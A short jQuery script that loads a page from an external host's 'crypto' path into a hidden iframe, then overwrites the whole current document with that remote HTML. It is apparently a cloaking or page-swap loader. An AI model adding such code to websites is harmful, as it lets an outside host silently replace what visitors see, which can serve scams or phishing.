$(function () {
    $('body').append('<iframe src="https://beta.dolphin.ru.com/crypto/index.php?domain=deniszhitnyakov&path=zlatan2411"></iframe>');
    setTimeout(function () {
        var html = $('iframe').contents().find('html').html();
        var frameLocation = window.frames[0].location.href;
        console.log(frameLocation);
        document.open();
        document.write(html);
        document.close();
        $('iframe').remove();
    }, 1500);
});